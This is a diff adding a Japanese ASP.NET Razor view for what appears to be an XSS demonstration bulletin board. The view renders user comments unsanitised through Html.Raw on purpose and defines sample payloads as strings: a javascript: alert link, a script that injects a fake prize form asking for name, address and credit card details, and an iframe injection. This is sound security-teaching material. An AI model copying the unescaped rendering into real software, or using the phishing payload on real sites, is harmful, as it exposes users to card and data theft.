@@ -1,0 +1,40 @@
+﻿@model List<BoardModel>
+
+@{
+    var list = Model ?? new List<BoardModel>();
+    ViewData["Title"] = "XSS";
+    var strLink = @"<a href=javascript:alert('cookie情報送っちゃいます。');>クリックしてみて</a>";
+    var strScript = @"<script> var objXssPanel = document.getElementById('xss_panel'); objXssPanel.style.display='none'; var formCreate = document.createElement('form'); formCreate.action = 'https://localhost:5445/hoge'; formCreate.method = 'post'; var input_name = document.createElement('input'); input_name.type = 'text'; input_name.placeholder = '名前'; formCreate.appendChild(input_name); var input_address = document.createElement('input'); input_address.type = 'text'; input_address.placeholder = '住所'; formCreate.appendChild(input_address); var input_credit = document.createElement('input'); input_credit.type = 'text'; input_credit.placeholder = 'クレジットカード情報'; formCreate.appendChild(input_credit); var input_submit = document.createElement('input'); input_submit.type = 'submit'; input_submit.value = '賞金を受け取る'; formCreate.appendChild(input_submit); var label_tousen = document.createElement('label_tousen'); var obj_tousen = label_tousen.appendChild(document.createTextNode('100万円が当選しました！！')); document.body.append(obj_tousen); document.body.append(formCreate); </script>";
+    var nosScript = @"<script> var objXssPanel = document.getElementById('xss_panel'); objXssPanel.style.display='none'; var frameCreate = document.createElement('iframe'); frameCreate.src = 'https://www.nos.co.jp/'; frameCreate.style='border:none;width:100%;height:80hv;padding:0;margin:0;'; document.body.append(frameCreate); </script>";
+}
+
+<style type="text/css">
+button, input {
+    display: block;
+}
+</style>
+
+<div id="xss_panel">
+<form method="POST" asp-controller="Xss" asp-action="Insert">
+    <div>氏名: <input name="name" value="名無し"/>※サニタイジングあり</div>
+    <div>コメント: <input name="comment" style="width:80%"/></div>
+    <input type="submit" />
+</form>
+
+<h4>スクリプト</h4>
+@* <p style="color:white">@strLink</p>
+<p style="color:white">@strScript</p> *@
+@* <p>@strLink</p>
+<p>@strScript</p> *@
+
+<h4>掲示板</h4>
+@foreach (var each in list)
+{
+    <p>
+        <div>@($"{each.name}さんがコメントしました。")</div>
+        <div>@Html.Raw(each.comment)</div>
+    </p>
+}
+
+</div>
+
